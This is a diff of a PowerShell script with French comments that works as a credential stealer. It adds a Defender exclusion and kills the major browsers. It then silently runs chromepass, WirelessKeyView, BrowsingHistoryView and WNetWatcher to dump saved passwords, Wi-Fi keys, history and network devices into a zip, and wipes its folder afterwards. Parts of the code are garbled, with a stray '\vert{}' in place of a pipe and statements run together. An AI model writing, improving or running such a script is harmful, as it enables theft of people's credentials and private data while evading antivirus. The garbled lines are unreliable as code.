@@ -10,9 +10,12 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
-# Nettoyage préventif
+# Nettoyage absolu et forcé au démarrage pour éviter les verrous de fichiers
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 2
+if (Test-Path $basePath) {
+    Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
+}
 
 Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
@@ -36,19 +39,16 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION CHROMEPASS PROPRE (MODE SILENCIEUX FORCÉ) ---
+# --- EXTRACTION CHROMEPASS (MODE SILENCIEUX FORCÉ) ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
 $explorer = Get-Process -IncludeUserName \vert{} Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
 
-if ($explorer) {
-    # On lance l'outil et on le laisse écrire ses données pendant 5 secondes
-    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+if ($explorer) {$processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = "$basePath\chromepass.exe"
     $processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
     $processInfo.UseShellExecute =$true
     $p = [System.Diagnostics.Process]::Start($processInfo)
     Start-Sleep -Seconds 5
-    # On ferme de force la fenêtre graphique pour libérer le fichier et passer à la suite
     Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 } else {
     Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Hidden
@@ -65,7 +65,6 @@ if (Test-Path "$basePath\WNetWatcher.exe") {
     Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
 }
 
-# Petite pause pour s'assurer que les fichiers texte sont bien fermés par les binaires
 Start-Sleep -Seconds 2
 
 # Vérification et sécurisation des fichiers générés
@@ -105,7 +104,7 @@ try {
 
 $fileStream.Close()$fileStream.Dispose()
 
-# Nettoyage final sécurisé (on tue tout ce qui pourrait bloquer avant de supprimer)
+# Nettoyage final sécurisé
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
